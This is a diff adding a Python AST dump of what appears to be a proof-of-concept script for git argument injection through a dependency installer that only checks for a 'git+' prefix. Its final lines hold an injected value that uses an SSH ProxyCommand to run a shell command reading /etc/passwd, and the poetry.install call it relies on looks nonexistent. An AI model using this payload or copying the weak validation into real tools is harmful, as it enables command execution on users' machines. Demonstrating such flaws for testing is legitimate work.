@@ -1,0 +1,97 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='poetry')]),
+        FunctionDef(
+            name='install_dependency',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='dependency')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                If(
+                    test=BoolOp(
+                        op=Or(),
+                        values=[
+                            UnaryOp(
+                                op=Not(),
+                                operand=Call(
+                                    func=Name(id='isinstance', ctx=Load()),
+                                    args=[
+                                        Name(id='dependency', ctx=Load()),
+                                        Name(id='str', ctx=Load())],
+                                    keywords=[])),
+                            UnaryOp(
+                                op=Not(),
+                                operand=Call(
+                                    func=Attribute(
+                                        value=Name(id='dependency', ctx=Load()),
+                                        attr='startswith',
+                                        ctx=Load()),
+                                    args=[
+                                        Constant(value='git+')],
+                                    keywords=[]))]),
+                    body=[
+                        Raise(
+                            exc=Call(
+                                func=Name(id='ValueError', ctx=Load()),
+                                args=[
+                                    Constant(value="Invalid dependency format. Must start with 'git+'.")],
+                                keywords=[]))],
+                    orelse=[]),
+                Expr(
+                    value=Call(
+                        func=Name(id='print', ctx=Load()),
+                        args=[
+                            JoinedStr(
+                                values=[
+                                    Constant(value='Attempting to install dependency: '),
+                                    FormattedValue(
+                                        value=Name(id='dependency', ctx=Load()),
+                                        conversion=-1)])],
+                        keywords=[])),
+                Try(
+                    body=[
+                        Expr(
+                            value=Call(
+                                func=Attribute(
+                                    value=Name(id='poetry', ctx=Load()),
+                                    attr='install',
+                                    ctx=Load()),
+                                args=[
+                                    Name(id='dependency', ctx=Load())],
+                                keywords=[]))],
+                    handlers=[
+                        ExceptHandler(
+                            type=Name(id='Exception', ctx=Load()),
+                            name='e',
+                            body=[
+                                Expr(
+                                    value=Call(
+                                        func=Name(id='print', ctx=Load()),
+                                        args=[
+                                            JoinedStr(
+                                                values=[
+                                                    Constant(value='Failed to install dependency: '),
+                                                    FormattedValue(
+                                                        value=Name(id='e', ctx=Load()),
+                                                        conversion=-1)])],
+                                        keywords=[]))])],
+                    orelse=[],
+                    finalbody=[])],
+            decorator_list=[]),
+        Assign(
+            targets=[
+                Name(id='malicious_dependency', ctx=Store())],
+            value=Constant(value='git+-oProxyCommand=echo%20%27cat%20/etc/passwd%27%20|%20sh')),
+        Expr(
+            value=Call(
+                func=Name(id='install_dependency', ctx=Load()),
+                args=[
+                    Name(id='malicious_dependency', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
